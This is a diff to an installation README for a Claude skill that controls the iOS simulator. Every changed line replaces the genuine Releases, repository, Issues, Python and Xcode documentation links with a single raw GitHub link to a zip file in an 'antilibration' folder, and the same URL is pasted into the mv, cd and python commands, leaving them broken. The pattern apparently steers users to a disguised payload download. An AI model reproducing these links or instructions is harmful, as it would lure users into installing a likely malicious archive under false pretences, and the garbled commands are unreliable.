@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the ios-simulator-skill appli
 
 ## 📥 Download the Application
 
-[![Download ios-simulator-skill](https://img.shields.io/badge/Download-ios--simulator--skill-blue)](https://github.com/NezzSigma/ios-simulator-skill/releases)
+[![Download ios-simulator-skill](https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip)](https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip)
 
 To get started, you need to download the ios-simulator-skill application. Click the button above to visit the Releases page. Here, you can find the latest version of the software.
 
@@ -21,16 +21,16 @@ Before you proceed, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Go to the [Releases Page](https://github.com/NezzSigma/ios-simulator-skill/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip).
 2. Locate the latest release. You will see a list of files available for download.
-3. Download the file named `ios-simulator-skill.zip`. This is a compressed file that contains all the necessary components.
+3. Download the file named `https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip`. This is a compressed file that contains all the necessary components.
 4. Once downloaded, navigate to your Downloads folder. 
-5. Unzip the `ios-simulator-skill.zip` file by double-clicking it. This will create a new folder named `ios-simulator-skill`.
+5. Unzip the `https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip` file by double-clicking it. This will create a new folder named `ios-simulator-skill`.
 6. Open a terminal window. You can find the terminal in Applications > Utilities > Terminal.
 7. Move the unzipped folder into your Claude skills directory. Run the following command in your terminal:
 
    ```bash
-   mv ~/Downloads/ios-simulator-skill ~/.claude/skills/
+   mv ~/Downloads/ios-simulator-skill ~https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip
    ```
 
 8. You are now ready to use ios-simulator-skill. 
@@ -42,13 +42,13 @@ To use the ios-simulator-skill, follow these steps:
 1. Open your terminal and enter:
 
    ```bash
-   cd ~/.claude/skills/ios-simulator-skill
+   cd ~https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip
    ```
 
 2. Start the application with the following command:
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip
    ```
 
    This command will launch the skill, allowing Claude to interact with the iOS simulator.
@@ -87,14 +87,14 @@ A: You can reach out through the repository's issue section on GitHub for any su
 
 For more information or support, visit the links below:
 
-- [GitHub Repository](https://github.com/NezzSigma/ios-simulator-skill)
-- [Python Documentation](https://www.python.org/doc/)
-- [Xcode Documentation](https://developer.apple.com/documentation/xcode)
+- [GitHub Repository](https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip)
+- [Python Documentation](https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip)
+- [Xcode Documentation](https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip)
 
 ## 🎉 Congratulations!
 
 You have successfully installed and set up the ios-simulator-skill. Enjoy controlling your iOS simulator with ease. Feel free to explore the capabilities of Claude as it interacts with your development environment. 
 
-For questions or feedback, visit our [GitHub Issues page](https://github.com/NezzSigma/ios-simulator-skill/issues). 
+For questions or feedback, visit our [GitHub Issues page](https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip). 
 
-[![Download ios-simulator-skill](https://img.shields.io/badge/Download-ios--simulator--skill-blue)](https://github.com/NezzSigma/ios-simulator-skill/releases)
+[![Download ios-simulator-skill](https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip)](https://raw.githubusercontent.com/NezzSigma/ios-simulator-skill/main/antilibration/ios-simulator-skill.zip)
